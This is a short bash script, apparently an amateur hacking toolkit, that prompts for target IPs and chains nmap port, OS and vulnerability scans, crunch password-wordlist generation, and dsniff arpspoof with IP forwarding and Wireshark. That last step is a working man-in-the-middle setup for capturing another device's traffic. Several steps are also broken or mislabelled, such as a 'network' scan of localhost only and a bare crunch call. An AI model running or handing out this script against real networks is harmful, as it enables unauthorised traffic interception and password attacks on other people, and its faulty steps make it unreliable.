#!/bin/bash

echo "information about devices on the network in hidden way"
echo
nmap -sS 127.0.0.1

echo

echo "Address of the router your device is connected to"

ip route show

echo

echo "Addresses of devices connected to the network"

arp -a

echo

echo "Server information"
echo
echo "Enter the server IP address"

read target

curl -S -I "$target"

echo

echo "Number of devices connected to the network"
echo
echo "Enter IP address"

read target

nmap "$target"

echo

echo "The open ports"
echo
echo "Enter IP address"

read target

nmap -Pn "$target"

echo

echo "The operating  system in devices"
echo
echo "Enter IP address"

read target

nmap -A "$target"

echo

echo "Scan for Known vulnerabilities"
echo
echo "Enter IP address"

read target

nmap --script vuln "$target"

echo

echo "Guess passwords"

echo

echo "Install wordlists and crunch (if not installed) with wordlists -y and crunch -y"
echo

echo "Enter the password length for example 3 3"
read length
echo

echo "Enter the pattern for example %^@"
read pattern
echo

echo "Enter the file save path"
read outfile
echo

crunch "$length" "$length" -t "$pattern" -o "$outfile"

echo

echo "Monitor a device on the network"

echo

sudo apt install dsniff

echo
crunch

echo

echo "Enter the interface name"
read interface
echo

echo "Enter the target IP address"
read target
echo

echo "Enter the gateway IP address"
read gateway
echo

echo

sudo arpspoof -i "$interface" -t "$target" "$gateway"


echo

echo "Enter the interface name again"
read interface
echo

echo "Enter the gateway IP address"
read gateway
echo

echo "Enter the target IP address"
read target
echo

echo 1 | sudo tee  /proc/sys/net/ipv4/ip_forward

echo

sudo wireshark &

sudo arpspoof -i "$interface" -t "$gateway" "$target"
